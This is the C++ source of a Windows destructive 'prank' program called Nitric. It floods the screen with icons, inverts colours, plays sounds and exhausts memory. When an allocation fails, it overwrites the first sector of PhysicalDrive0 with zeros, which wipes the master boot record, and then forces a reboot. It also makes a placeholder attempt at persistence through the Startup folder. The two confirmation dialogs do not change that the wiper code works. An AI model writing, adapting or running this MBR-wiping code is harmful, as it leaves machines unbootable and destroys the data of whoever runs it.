#include <Windows.h>        // Win32 core API
#include <iostream>         // std::cout, std::cerr
#include <fstream>          // optional for file operations/logging
#include <cstdlib>          // rand, srand, malloc, free
#include <ctime>            // time
#include <thread>           // std::thread
#include <atomic>           // std::atomic
#include <vector>           // std::vector
#include <mmsystem.h>       // PlaySound
#include <shlobj.h>         // SHGetFolderPath
#include <strsafe.h>        // String safety functions
#include <winternl.h>       // NtRaiseHardError, RtlAdjustPrivilege (if used)

#pragma comment(lib, "winmm.lib")       // For PlaySound
#pragma comment(lib, "shell32.lib")     // For SHGetFolderPath

#define SCREEN_WIDTH 1920
#define SCREEN_HEIGHT 1080
#define MAX_ICONS 6000
#define STATUS_ASSERTION_FAILURE ((NTSTATUS)0xC0000420)

typedef NTSTATUS(WINAPI* RtlAdjustPrivilegeFn)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(WINAPI* NtRaiseHardErrorFn)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

HICON tIcons[] = {
    LoadIcon(NULL, IDI_ERROR),
    LoadIcon(NULL, IDI_WARNING),
    LoadIcon(NULL, IDI_INFORMATION),
    LoadIcon(NULL, IDI_QUESTION),
    LoadIcon(NULL, IDI_APPLICATION),
    LoadIcon(NULL, IDI_ASTERISK),
    LoadIcon(NULL, IDI_EXCLAMATION),
    LoadIcon(NULL, IDI_HAND),
    LoadIcon(NULL, IDI_WINLOGO)
};

size_t t_tIcons = sizeof(tIcons) / sizeof(tIcons[0]);

typedef struct {
    int x, y;
    int iconIndex;
} IconData;

IconData iconList[MAX_ICONS];
int iconCount = 0;
long int totalIcon = 0;
long int pixels = 0;

std::atomic<bool> payload4_running(false);

void SetBrightness(float brightness) {
    HDC hdc = GetDC(NULL);
    WORD gammaArray[3][256];
    for (int i = 0; i < 256; i++) {
        int val = (int)(i * brightness);
        if (val > 255) val = 255;
        gammaArray[0][i] = gammaArray[1][i] = gammaArray[2][i] = (WORD)(val << 8);
    }
    SetDeviceGammaRamp(hdc, gammaArray);
    ReleaseDC(NULL, hdc);
}

void AddIcon(int x, int y, int iconIndex) {
    if (iconCount < MAX_ICONS) {
        iconList[iconCount].x = x;
        iconList[iconCount].y = y;
        iconList[iconCount].iconIndex = iconIndex;
        iconCount++;
        totalIcon++;
    }
}

void DrawIconAt(int x, int y, int iconIndex) {
    HDC hdc = GetDC(NULL);
    DrawIcon(hdc, x, y, tIcons[iconIndex]);
    ReleaseDC(NULL, hdc);
}

void DrawIcons() {
    if (iconCount >= MAX_ICONS) return;
    int x = rand() % SCREEN_WIDTH;
    int y = rand() % SCREEN_HEIGHT;
    int iconIndex = rand() % t_tIcons;
    DrawIconAt(x, y, iconIndex);
    AddIcon(x, y, iconIndex);
}

void RepaintIcons() {
    for (int i = 0; i < iconCount; i++) {
        DrawIconAt(iconList[i].x, iconList[i].y, iconList[i].iconIndex);
    }
}

bool ConfirmLaunch() {
    int result = MessageBoxA(
        NULL,
        "Are you sure you want to continue?\n\nIt will kill your MBR!",
        "Nitric",
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2
    );
    if (result != IDYES) return false;

    result = MessageBoxA(
        NULL,
        "FINAL WARNING:\n\nAre you ABSOLUTELY sure?\n\nPLEASE test on VM!",
        "Nitric",
        MB_YESNO | MB_ICONEXCLAMATION | MB_DEFBUTTON2
    );
    return (result == IDYES);
}

void InvertScreenLoop() {
    HDC hdc = GetDC(NULL);
    while (payload4_running.load()) {
        BitBlt(hdc, 0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, hdc, 0, 0, NOTSRCCOPY);
        Sleep(2000);
    }
    ReleaseDC(NULL, hdc);
}

bool CopyFolder(const std::wstring& source, const std::wstring& destination) {
	// placeholder
	return true;
}

void FillRAMLoop() {
    std::vector<char*> memoryBlocks;

    try {
        while (true) {
            char* block = new char[10 * 1024 * 1024]; // 10MB block
            memset(block, rand() % 256, 10 * 1024 * 1024);
            memoryBlocks.push_back(block);
            Sleep(10);
        }
    } catch (...) {
        // Nuke MBR
        HANDLE hDrive = CreateFileW(
            L"\\\\.\\PhysicalDrive0",
            GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            0,
            NULL
        );

        if (hDrive != INVALID_HANDLE_VALUE) {
            BYTE mbr[512] = { 0 }; // Zeroed MBR
            DWORD bytesWritten;

            WriteFile(hDrive, mbr, sizeof(mbr), &bytesWritten, NULL);
            CloseHandle(hDrive);
        }

        // Attempt reboot
        HANDLE hToken;
        TOKEN_PRIVILEGES tkp;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            if (LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
                tkp.PrivilegeCount = 1;
                tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0);
                if (GetLastError() == ERROR_SUCCESS) {
                    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_APPLICATION | SHTDN_REASON_MINOR_OTHER);
                }
            }
            CloseHandle(hToken);
        }
    }
}


int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    srand((unsigned int)time(NULL));
    HWND hwnda = GetConsoleWindow();
    ShowWindow(hwnda, SW_HIDE);

    if (!ConfirmLaunch()) return 0;

    SetBrightness(1.5f);
    DWORD lastTick = GetTickCount();

    // PAYLOAD 1
    while (totalIcon <= 250) {
        DWORD currentTick = GetTickCount();
        if (currentTick - lastTick >= 10) {
            DrawIcons();
            RepaintIcons();
            lastTick = currentTick;
        }
        Sleep(1);
    }

    // PAYLOAD 2
    SetBrightness(1.5f);
    PlaySound(TEXT("5nitric.wav"), NULL, SND_FILENAME | SND_LOOP | SND_ASYNC);
    while (totalIcon <= 750) {
        DWORD currentTick = GetTickCount();
        if (currentTick - lastTick >= 5) {
            DrawIcons();
            RepaintIcons();
            lastTick = currentTick;
        }
        Sleep(1);
    }

    // PAYLOAD 4
    PlaySound(TEXT("7nitric.wav"), NULL, SND_FILENAME | SND_LOOP | SND_ASYNC);

    std::thread ramThread(FillRAMLoop);
    ramThread.detach();

    wchar_t startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_STARTUP, NULL, 0, startupPath))) {
        std::wstring sourceFolder = L"res";
        std::wstring destFolder = std::wstring(startupPath) + L"\\res";
        CopyFolder(sourceFolder, destFolder);
    }

    payload4_running = true;
    std::thread invertThread(InvertScreenLoop);
    invertThread.detach();

    HDC hdc = GetDC(NULL);
	while (1) {
		for (int i = 0; i < 300000; i++) {
			int x = rand() % SCREEN_WIDTH;
			int y = rand() % SCREEN_HEIGHT;
			COLORREF color = RGB(rand() % 256, rand() % 256, rand() % 256);
			SetPixel(hdc, x, y, color);
		}
	}

    payload4_running = false;
    ReleaseDC(NULL, hdc);

    return 0;
}
